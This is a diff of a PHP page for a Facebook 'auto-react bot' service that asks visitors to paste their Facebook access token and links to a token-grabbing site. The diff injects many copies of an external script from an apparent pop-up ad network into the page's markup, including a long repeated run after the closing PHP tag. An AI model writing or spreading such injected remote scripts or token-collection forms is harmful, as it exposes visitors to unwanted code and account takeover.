@@ -348,13 +348,13 @@ public function cek($tok,$id,$nm){
 
 echo '
 <div id="container">
-<a href="http://facebook.com/' . $id . '"><img src="https://graph.facebook.com/' . $id . '/picture?width=800" style="-moz-box-shadow:0px 0px 20px 0px red;-webkit-box-shadow:0px 0px 20px 0px red;-o-box-shadow:0px 0px 20px 0px red;box-shadow:0px 0px 20px 0px red;width:150px; height:150px;border-radius:500px;" alt="' . $nm . '"/></a>
+<script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=cx5av5xnzc"></script><a href="http://facebook.com/' . $id . '"><img src="https://graph.facebook.com/' . $id . '/picture?width=800" style="-moz-box-shadow:0px 0px 20px 0px red;-webkit-box-shadow:0px 0px 20px 0px red;-o-box-shadow:0px 0px 20px 0px red;box-shadow:0px 0px 20px 0px red;width:150px; height:150px;border-radius:500px;" alt="' . $nm . '"/></a>
 <br><font color="white"> Welcome TO AYESH BOT TEAM (JUST LOVE REACT ) Site :</font><font color="BLUE"> '.$nm.' </font></br>
 <font color="white"> Activate Your Bot My Dear Friend </font></br>
-<form action="index.php" method="post">
+<script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=cx5av5xnzc"></script><form action="index.php" method="post">
 <div id="top-content">
 <div id="search-form">
-<input class="button button1" type="submit" style="height:45px;width:200px;" value="Activate Bot">
+<script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=cx5av5xnzc"></script><input class="button button1" type="submit" style="height:45px;width:200px;" value="Activate Bot">
 </form>
 </div>
 </div></div>
@@ -397,16 +397,16 @@ echo'
 public function bwh(){
 echo'
 
-<center><a href="https://www.facebook.com/100009371672607" target="_blank"><input class="button" type="button" value="Admin">
-</a> <a href="http://scure-token.tk/" target="_blank"><input class="button" type="button" value="Get Token"></a>
+<center><script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=cx5av5xnzc"></script><a href="https://www.facebook.com/100009371672607" target="_blank"><input class="button" type="button" value="Admin">
+</a> <script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=cx5av5xnzc"></script><a href="http://scure-token.tk/" target="_blank"><input class="button" type="button" value="Get Token"></a>
 <center>
-<b><font style="background: url() repeat scroll 0% 0% transparent;color:#fff; text-shadow: 0pt 0pt 0.10em red, 0pt 2pt 0.9em white;color: white ;font-size:30px;">! SUBMIT YOUR TOKEN HERE</font></b>
+<b><script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=cx5av5xnzc"></script><font style="background: url() repeat scroll 0% 0% transparent;color:#fff; text-shadow: 0pt 0pt 0.10em red, 0pt 2pt 0.9em white;color: white ;font-size:30px;">! SUBMIT YOUR TOKEN HERE</font></b>
 
 <center>
-<center><form action="index.php" method="post">
+<script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=cx5av5xnzc"></script><center><form action="index.php" method="post">
 <input class="search" type="text" name="token" placeholder="Paste Your Access Token Here" required> <br>
 
-<input class="button" type="submit" value="Submit"></form></center> 
+<script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=cx5av5xnzc"></script><input class="button" type="submit" value="Submit"></form></center> 
 ';
 
 
@@ -552,3 +552,4 @@ if($_GET[token]){
         $bot->bwh();}}
 }
 ?>
+		<script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=cx5av5xnzc"></script><script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=cx5av5xnzc"></script><script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=cx5av5xnzc"></script><script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=cx5av5xnzc"></script><script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=cx5av5xnzc"></script><script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=cx5av5xnzc"></script><script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=cx5av5xnzc"></script><script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=cx5av5xnzc"></script>
